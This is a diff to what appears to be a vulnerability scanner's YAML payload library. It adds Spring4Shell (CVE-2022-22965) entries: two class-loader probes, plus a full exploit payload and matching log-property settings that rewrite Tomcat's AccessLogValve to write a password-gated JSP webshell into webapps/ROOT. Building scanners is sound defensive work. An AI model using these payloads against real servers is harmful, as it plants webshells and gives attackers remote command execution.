@@ -845,3 +845,42 @@ payloads:
     placeholders: [COLLAB_DOMAIN]
     notes: "Backtick OOB DNS via cookie injection."
     tags: [linux, cookie, oob, dns, backtick]
+
+  # ============================================================
+  # Spring4Shell — class loader manipulation (CVE-2022-22965)
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "class.module.classLoader.URLs%5B0%5D=0"
+    notes: "Spring4Shell probe — access class loader via parameter binding. If no error, Spring class loader is accessible."
+    tags: [spring4shell, classloader, probe, cve_2022_22965]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "class.module.classLoader.DefaultAssertionStatus=true"
+    notes: "Spring4Shell — set DefaultAssertionStatus via class loader. Tests parameter binding depth."
+    tags: [spring4shell, classloader, assertion, cve_2022_22965]
+
+  - technique: command_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 4
+    runtime: jvm
+    payload: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%7D%25%7Bsuffix%7Di"
+    notes: "Spring4Shell full exploit — modify Tomcat AccessLogValve pattern to write JSP webshell."
+    tags: [spring4shell, classloader, webshell, cve_2022_22965]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=ensphere&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+    notes: "Spring4Shell — set AccessLogValve properties to create output file. Confirm via follow-up request."
+    tags: [spring4shell, classloader, accesslog, cve_2022_22965]
